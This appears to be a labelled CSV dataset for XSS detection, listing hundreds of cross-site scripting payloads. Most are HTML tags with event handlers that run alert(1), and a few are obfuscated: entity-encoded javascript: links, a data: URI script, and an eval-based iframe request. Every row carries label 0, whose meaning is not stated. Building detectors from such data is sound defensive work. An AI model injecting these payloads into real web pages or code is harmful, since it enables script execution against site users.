query,label
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",0
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>",0
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></option>",0
"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>",0
"<area onmouseenter=""alert(1)"">test</area>",0
"<shadow oncontextmenu=""alert(1)"">test</shadow>",0
"<set draggable=""true"" ondragstart=""alert(1)"">test</set>",0
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,0
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationstart=""alert(1)""></td>",0
"<section onmouseleave=""alert(1)"">test</section>",0
"<style>:target {transform: rotate(180deg);}</style><font id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></font>",0
"<rtc draggable=""true"" ondrag=""alert(1)"">test</rtc>",0
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationend=""alert(1)""></dir>",0
"<slot onbeforecut=""alert(1)"" contenteditable>test</slot>",0
"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",0
"<style>@keyframes x{}</style><s style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></s>",0
"<style>@keyframes slidein {}</style><tr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tr>",0
<source onpointerrawupdate=alert(1)>XSS</source>,0
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,0
"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onanimationstart=""alert(1)""></image3>",0
"<audio2 onmouseenter=""alert(1)"">test</audio2>",0
"<body onresize=""alert(1)"">",0
<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>,0
<ul onpointerleave=alert(1)>XSS</ul>,0
<b onafterscriptexecute=alert(1)><script>1</script>,0
"<video oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionstart=alert(1)></nextid>",0
"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",0
<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>,0
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",0
<tbody onmousewheel=alert(1)>requires scrolling,0
"<slot onmousedown=""alert(1)"">test</slot>",0
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",0
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></noframes>",0
"<source ondblclick=""alert(1)"" autofocus tabindex=1>test</source>",0
"<style>:target {transform: rotate(180deg);}</style><base id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></base>",0
"<style>:target {color: red;}</style><section id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></section>",0
"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",0
<applet onafterscriptexecute=alert(1)><script>1</script>,0
<abbr onpointerout=alert(1)>XSS</abbr>,0
<base onmousewheel=alert(1)>requires scrolling,0
<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>,0
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationend=""alert(1)""></abbr>",0
"<style>:target {color:red;}</style><video2 id=x style=""transition:color 1s"" ontransitionend=alert(1)></video2>",0
<source onmousewheel=alert(1)>requires scrolling,0
"<a onmousedown=""alert(1)"">test</a>",0
"<rt onkeydown=""alert(1)"" contenteditable>test</rt>",0
"<rb onmouseleave=""alert(1)"">test</rb>",0
"<tbody onmouseenter=""alert(1)"">test</tbody>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></map>",0
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",0
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,0
"<set onmouseleave=""alert(1)"">test</set>",0
<tbody id=x tabindex=1 onfocus=alert(1)></tbody>,0
<p onmousewheel=alert(1)>requires scrolling,0
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dl>",0
"<style>:target {transform: rotate(180deg);}</style><label id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></label>",0
"<rb onkeyup=""alert(1)"" contenteditable>test</rb>",0
"<pre draggable=""true"" ondragenter=""alert(1)"">test</pre>",0
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",0
<span onpointerdown=alert(1)>XSS</span>,0
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",0
<track id=x tabindex=1 onactivate=alert(1)></track>,0
<source onpointerdown=alert(1)>XSS</source>,0
"<slot oncontextmenu=""alert(1)"">test</slot>",0
"<em draggable=""true"" ondragend=""alert(1)"">test</em>",0
"<em draggable=""true"" ondragenter=""alert(1)"">test</em>",0
<address onpointerover=alert(1)>XSS</address>,0
<rb onmousewheel=alert(1)>requires scrolling,0
<wbr onpointerout=alert(1)>XSS</wbr>,0
<section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>,0
"<ul onmouseover=""alert(1)"">test</ul>",0
"<br onmouseenter=""alert(1)"">test</br>",0
"<style>:target {transform: rotate(180deg);}</style><nav id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nav>",0
"<style>:target {color: red;}</style><var id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></var>",0
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationend=""alert(1)""></canvas>",0
"<rb draggable=""true"" ondragstart=""alert(1)"">test</rb>",0
"<abbr draggable=""true"" ondragenter=""alert(1)"">test</abbr>",0
<p onpointerout=alert(1)>XSS</p>,0
<element id=x tabindex=1 onactivate=alert(1)></element>,0
<s id=x tabindex=1 onfocusin=alert(1)></s>,0
<tt id=x tabindex=1 onfocus=alert(1)></tt>,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rb id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rb>",0
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>",0
"<summary onmouseleave=""alert(1)"">test</summary>",0
"<style>@keyframes slidein {}</style><datalist style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></datalist>",0
"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",0
"<style>@keyframes slidein {}</style><td style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></td>",0
"<style>@keyframes x{}</style><div style=""animation-name:x"" onanimationstart=""alert(1)""></div>",0
"<track onmouseover=""alert(1)"">test</track>",0
"<svg oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
<body onselectionchange=alert(1)>select some text,0
"<style>:target {color:red;}</style><track id=x style=""transition:color 1s"" ontransitionend=alert(1)></track>",0
"<element onclick=""alert(1)"">test</element>",0
"<a onmouseover=""alert(1)"">test</a>",0
<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>,0
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,0
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",0
<plaintext onbeforescriptexecute=alert(1)><script>1</script>,0
"<template draggable=""true"" ondragleave=""alert(1)"">test</template>",0
"<style>@keyframes slidein {}</style><progress style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></progress>",0
<dialog onpointerup=alert(1)>XSS</dialog>,0
<section onpointerleave=alert(1)>XSS</section>,0
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationstart=""alert(1)""></rtc>",0
"<strong onmouseenter=""alert(1)"">test</strong>",0
<dt onpointerrawupdate=alert(1)>XSS</dt>,0
"<style>@keyframes x{}</style><colgroup style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></colgroup>",0
"<textarea draggable=""true"" ondragend=""alert(1)"">test</textarea>",0
"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>",0
<a2 onpointerup=alert(1)>XSS</a2>,0
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></pre>",0
"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></image>",0
"<video onmousemove=""alert(1)"">test</video>",0
"<style>@keyframes slidein {}</style><samp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></samp>",0
"<rt onbeforecut=""alert(1)"" contenteditable>test</rt>",0
"<element oncut=alert(1) value=""XSS"" autofocus tabindex=1>test",0
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><video id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></video>",0
"<rtc onbeforepaste=""alert(1)"" contenteditable>test</rtc>",0
<animate id=x tabindex=1 onactivate=alert(1)></animate>,0
"<tt draggable=""true"" ondragleave=""alert(1)"">test</tt>",0
<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>,0
<select onpointerrawupdate=alert(1)>XSS</select>,0
"<audio2 oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>",0
"<style>@keyframes x{}</style><details style=""animation-name:x"" onwebkitanimationend=""alert(1)""></details>",0
"<section onkeyup=""alert(1)"" contenteditable>test</section>",0
<body onafterscriptexecute=alert(1)><script>1</script>,0
<textarea onbeforepaste=alert(1) autofocus></textarea>,0
"<style>:target {color:red;}</style><a2 id=x style=""transition:color 1s"" ontransitionend=alert(1)></a2>",0
"<style>@keyframes x{}</style><a2 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></a2>",0
"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></bdi>",0
<pre onpointerout=alert(1)>XSS</pre>,0
"<tt onmouseout=""alert(1)"">test</tt>",0
"<animatetransform draggable=""true"" ondragend=""alert(1)"">test</animatetransform>",0
<video2 onmousewheel=alert(1)>requires scrolling,0
"<rt onmouseleave=""alert(1)"">test</rt>",0
"<output onmouseup=""alert(1)"">test</output>",0
<base onpointerout=alert(1)>XSS</base>,0
"<tr onpaste=""alert(1)"" contenteditable>test</tr>",0
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",0
"<select onmouseup=""alert(1)"">test</select>",0
<th onpointerleave=alert(1)>XSS</th>,0
"<section draggable=""true"" ondragenter=""alert(1)"">test</section>",0
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",0
"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",0
"<ruby onbeforecut=""alert(1)"" contenteditable>test</ruby>",0
<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>,0
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></colgroup>",0
"<style>@keyframes slidein {}</style><input3 style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></input3>",0
"<style>:target {color: red;}</style><head id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></head>",0
"<plaintext oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,0
<source onpointerout=alert(1)>XSS</source>,0
"<article ondblclick=""alert(1)"" autofocus tabindex=1>test</article>",0
<animatetransform onpointerleave=alert(1)>XSS</animatetransform>,0
<select onpointerleave=alert(1)>XSS</select>,0
<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>,0
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",0
<video controls src=1 onfocus=alert(1) autofocus>,0
"<output ondblclick=""alert(1)"" autofocus tabindex=1>test</output>",0
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></progress>",0
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationend=""alert(1)""></template>",0
"<style>:target {color:red;}</style><applet id=x style=""transition:color 1s"" ontransitionstart=alert(1)></applet>",0
"<wbr onkeypress=""alert(1)"" contenteditable>test</wbr>",0
"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>",0
<progress onpointermove=alert(1)>XSS</progress>,0
"<style>:target {color: red;}</style><animatemotion id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></animatemotion>",0
"<style>:target {color:red;}</style><dialog id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></dialog>",0
"<template onkeydown=""alert(1)"" contenteditable>test</template>",0
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",0
<body onafterprint=alert(1)>,0
"<article onpaste=""alert(1)"" contenteditable>test</article>",0
"<p draggable=""true"" ondragenter=""alert(1)"">test</p>",0
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dir>",0
<small id=x tabindex=1 onactivate=alert(1)></small>,0
<video onpointerover=alert(1)>XSS</video>,0
"<blockquote draggable=""true"" ondragenter=""alert(1)"">test</blockquote>",0
"<rp draggable=""true"" ondragenter=""alert(1)"">test</rp>",0
"<style>:target {color:red;}</style><br id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></br>",0
"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",0
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",0
"<style>:target {color:red;}</style><frame id=x style=""transition:color 1s"" ontransitionend=alert(1)></frame>",0
"<b onpaste=""alert(1)"" contenteditable>test</b>",0
<u onafterscriptexecute=alert(1)><script>1</script>,0
"<pre onmousedown=""alert(1)"">test</pre>",0
"<style>@keyframes slidein {}</style><tbody style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></tbody>",0
<small onpointerout=alert(1)>XSS</small>,0
<track onpointermove=alert(1)>XSS</track>,0
"<tfoot ondblclick=""alert(1)"" autofocus tabindex=1>test</tfoot>",0
"<dt onkeypress=""alert(1)"" contenteditable>test</dt>",0
<u id=x tabindex=1 onfocus=alert(1)></u>,0
"<param onmouseenter=""alert(1)"">test</param>",0
<abbr onpointerenter=alert(1)>XSS</abbr>,0
<strong onpointerdown=alert(1)>XSS</strong>,0
"<style>@keyframes x{}</style><th style=""animation-name:x"" onwebkitanimationend=""alert(1)""></th>",0
<table onpointermove=alert(1)>XSS</table>,0
"<address onpaste=""alert(1)"" contenteditable>test</address>",0
"<video onkeyup=""alert(1)"" contenteditable>test</video>",0
"<tfoot draggable=""true"" ondragstart=""alert(1)"">test</tfoot>",0
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>,0
<button onpointermove=alert(1)>XSS</button>,0
<q onpointerout=alert(1)>XSS</q>,0
<rt onmousewheel=alert(1)>requires scrolling,0
"<style>:target {transform: rotate(180deg);}</style><tr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tr>",0
"<style>:target {color:red;}</style><command id=x style=""transition:color 1s"" ontransitionend=alert(1)></command>",0
<section onpointerrawupdate=alert(1)>XSS</section>,0
"<source draggable=""true"" ondragend=""alert(1)"">test</source>",0
"<style>@keyframes slidein {}</style><iframe style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></iframe>",0
"<th draggable=""true"" ondragend=""alert(1)"">test</th>",0
"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationend=""alert(1)""></ins>",0
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></fieldset>",0
"<br ondblclick=""alert(1)"" autofocus tabindex=1>test</br>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></abbr>",0
"<style>:target {color:red;}</style><progress id=x style=""transition:color 1s"" ontransitionend=alert(1)></progress>",0
<th id=x tabindex=1 onfocus=alert(1)></th>,0
"<style>:target {transform: rotate(180deg);}</style><iframe id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></iframe>",0
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></img>",0
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,0
<time onmousewheel=alert(1)>requires scrolling,0
<tbody onpointerdown=alert(1)>XSS</tbody>,0
<source onpointerup=alert(1)>XSS</source>,0
"<style>:target {color:red;}</style><frame id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></frame>",0
"<s onmouseleave=""alert(1)"">test</s>",0
<rb id=x tabindex=1 onfocusin=alert(1)></rb>,0
"<style>@keyframes x{}</style><animatemotion style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animatemotion>",0
<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,0
<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>,0
<span id=x tabindex=1 onfocusin=alert(1)></span>,0
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,0
"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></img>",0
"<u onkeydown=""alert(1)"" contenteditable>test</u>",0
<style onmousewheel=alert(1)>requires scrolling,0
"<style>:target {color:red;}</style><dd id=x style=""transition:color 1s"" ontransitionend=alert(1)></dd>",0
"<rt draggable=""true"" ondragleave=""alert(1)"">test</rt>",0
"<style>@keyframes slidein {}</style><bdi style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdi>",0
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" ontransitionstart=alert(1)></area>",0
"<set onmousedown=""alert(1)"">test</set>",0
<template onpointerover=alert(1)>XSS</template>,0
"<style>@keyframes x{}</style><video2 style=""animation-name:x"" onanimationend=""alert(1)""></video2>",0
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onwebkitanimationend=""alert(1)""></ul>",0
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationstart=""alert(1)""></dir>",0
"<script draggable=""true"" ondragleave=""alert(1)"">test</script>",0
"<samp onbeforecopy=""alert(1)"" contenteditable>test</samp>",0
<script onload=alert(1) src=validjs.js></script>,0
<dir onpointerover=alert(1)>XSS</dir>,0
"<style>@keyframes slidein {}</style><link style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></link>",0
"<style>@keyframes slidein {}</style><button style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></button>",0
<animatetransform onpointerup=alert(1)>XSS</animatetransform>,0
"<title onbeforepaste=""alert(1)"" contenteditable>test</title>",0
"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionstart=alert(1)></b>",0
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationend=""alert(1)""></map>",0
"<small onclick=""alert(1)"">test</small>",0
"<a2 oncopy=alert(1) value=""XSS"" autofocus tabindex=1>test",0
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",0
"<abbr oncontextmenu=""alert(1)"">test</abbr>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><kbd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></kbd>",0
<picture onpointerout=alert(1)>XSS</picture>,0
"<style>:target {color:red;}</style><frame id=x style=""transition:color 1s"" ontransitionstart=alert(1)></frame>",0
<plaintext onpointerleave=alert(1)>XSS</plaintext>,0
"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",0
"<style>@keyframes x{}</style><image3 style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></image3>",0
"<style>:target {transform: rotate(180deg);}</style><dfn id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dfn>",0
<spacer onpointermove=alert(1)>XSS</spacer>,0
"<style>:target {color:red;}</style><basefont id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></basefont>",0
"<style>:target {transform: rotate(180deg);}</style><summary id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></summary>",0
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></applet>",0
"<th ondblclick=""alert(1)"" autofocus tabindex=1>test</th>",0
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationend=""alert(1)""></ruby>",0
"<pre onmouseout=""alert(1)"">test</pre>",0
"<style>:target {color:red;}</style><code id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></code>",0
<slot id=x tabindex=1 onfocusin=alert(1)></slot>,0
<body onpointerrawupdate=alert(1)>XSS</body>,0
"<style>@keyframes x{}</style><param style=""animation-name:x"" onanimationend=""alert(1)""></param>",0
<animatetransform id=x tabindex=1 onbeforeactivate=alert(1)></animatetransform>,0
"<section onmousedown=""alert(1)"">test</section>",0
"<plaintext draggable=""true"" ondragleave=""alert(1)"">test</plaintext>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></optgroup>",0
<dir onpointerup=alert(1)>XSS</dir>,0
"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",0
<strike onpointermove=alert(1)>XSS</strike>,0
"<style>:target {color: red;}</style><img2 id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></img2>",0
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,0
<svg onpointerout=alert(1)>XSS</svg>,0
"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionstart=alert(1)></option>",0
<sub id=x tabindex=1 onactivate=alert(1)></sub>,0
"<q onkeypress=""alert(1)"" contenteditable>test</q>",0
"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",0
"<sub ondblclick=""alert(1)"" autofocus tabindex=1>test</sub>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></source>",0
